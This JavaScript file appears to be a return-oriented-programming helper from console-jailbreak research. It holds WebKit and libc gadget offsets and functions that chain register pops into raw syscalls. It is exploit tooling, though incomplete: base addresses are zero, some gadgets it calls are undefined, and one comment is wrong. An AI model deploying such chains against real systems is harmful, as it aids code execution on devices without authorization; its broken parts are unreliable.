// ROPChain Framework by m0rph3us1987
// 
// Some parts of code are inspired from CTurt's Just-ROPChain. A BIG THANK YOU!

function ROPChain() {
	// Executable/Library base addresses
	var mWebkit = 0;
	var mLibc = 0;
	var mLibA = 0;
	
	var GlobalRBP = 0;
	
	
	// This will hold the ROP chain
	this.Chain = new Array();
	
	// Available gadgets
	this.Gadgets = [];
	this.Gadgets['pop rax'] = mWebkit + 0x777D3;
	this.Gadgets['pop rbx'] = mWebkit + 0xB8936;
	this.Gadgets['pop rcx'] = mWebkit + 0x5398F;
	
	this.Gadgets['syscall'] = mLibc + 0x000004ba;	
	this.Gadgets['nop'] = mLibc + 0x000000000000312e;
	
	// This function appends the desired gadget to the chain
	this.Add = function(Instruction, arg1){
		this.Chain.push(this.Gadgets[Instruction]);
		
		if(typeof(arg1) !== "undefined") this.PushValue(arg1);
	};
	
	// This function appends the desired value to the chain
	this.PushValue = function(value){
		this.Chain.push(value);
	};
	
	this.Init = function(rbp) {
		this.GlobalRBP = rbp;
		this.ClearR10(3042683837);
	}
	
	this.Syscall = function(systemCallNumber, arg1, arg2, arg3, arg4, arg5, arg6) {
		
		if(typeof(arg6) !== "undefined") this.SetR9(arg6);		
		// This part is done before, because r8, rdx and rax will be overwritten
		if(typeof(arg4) !== "undefined") this.SetR10(arg4);
		
		this.Add('pop rax',systemCallNumber);
		
		if(typeof(arg1) !== "undefined") this.Add('pop rdi', arg1);
		if(typeof(arg2) !== "undefined") this.Add('pop rsi', arg2);
		if(typeof(arg3) !== "undefined") this.Add('pop rdx',arg3);		
		if(typeof(arg5) !== "undefined") this.Add('pop r8', arg5);
		
		this.Add('syscall');
	}
	
	// This function will clear content of r8 and rax
	this.ClearR10 = function(subValue){
		this.Add('pop r8',subValue);
		this.Add('sub r10,r8',this.GlobalRBP);
	}
	
	// This function will clear content of rdx and rax
	this.SetR10 = function(rdx){
		this.Add('pop rdx',rdx);
		this.Add('add r10,rdx');
	}
	
	this.SetR9 = function(r9){
		this.Add('pop rcx',r9);
		this.Add('pop rdi',this.GlobalRBP);
		this.Add('mov r9,rcx');
		this.PushValue(this.GlobalRBP);		
	}
}

